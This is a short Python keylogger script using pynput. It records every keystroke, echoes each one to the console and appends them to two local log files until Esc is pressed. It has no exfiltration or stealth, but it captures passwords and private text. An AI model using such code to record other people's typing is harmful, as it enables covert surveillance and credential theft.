from pynput import keyboard


Allkeylogsfile=open("AllLoggedKeys.txt",'a')
keyWordslogs=open("LoggedKeyWords.txt",'a')
keys=[]
word_Keys=[]



def pressed(key):

    global keys  
    global word_Keys
    try:
        print('{0} pressed'.format(key.char))
        keys.append(key.char)
        word_Keys.append(key.char)

    except AttributeError:
        if key == keyboard.Key.space:
                print('Space key pressed')
                keys.append(f"<{key}>")
                word_Keys.append(" ")
        elif key == keyboard.Key.enter:
                print('Enter key pressed')
                keys.append(f"<{key}>")
                word_Keys.append("\n")
        else:
                print(f'Special key {key} pressed')
                keys.append(f"<{key}>")
                word_Keys.append(f"<{key}>")



def released(key):
    print('{0} released'.format( key))
    if key == keyboard.Key.esc:
        write_File(keys)
        write_File(word_Keys)
        
        return False
    
  
def write_File(key):
    for key in keys:
        Allkeylogsfile.write(str(key))
        Allkeylogsfile.write("\n")
    keys.clear()    
    
    for key in word_Keys :
        keyWordslogs.write(str(key))
    word_Keys.clear()    

with keyboard.Listener( on_press=pressed, on_release=released) as listener:
    listener.join()
    

